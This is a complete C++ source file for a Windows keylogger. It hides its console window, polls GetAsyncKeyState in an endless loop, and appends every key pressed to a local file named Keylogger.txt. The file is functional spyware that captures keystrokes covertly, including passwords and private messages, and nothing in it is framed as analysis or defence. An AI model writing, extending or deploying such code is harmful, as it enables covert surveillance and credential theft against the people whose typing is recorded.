#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;

void flog(string g);

bool Otg(int key)
{
	switch (key) {
	case VK_SPACE:
		flog(" ");
		return true;
	case VK_RETURN:
		flog("[RETURN]");
		return true;
	case VK_CAPITAL:
		flog("[CAPS LOCK]");
	default:
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {

					fstream Keylogger;
					Keylogger.open("Keylogger.txt", fstream::app);
					if (Keylogger.is_open()) {
						Keylogger << char(KEY);
						Keylogger.close();
					}
					
				}
			}
		}
	}

void flog(string g)
{
	fstream Keylogger;
	Keylogger.open("Keylogger.txt", fstream::app);
	if (Keylogger.is_open()) {
		Keylogger << g;
		Keylogger.close();
	}
}
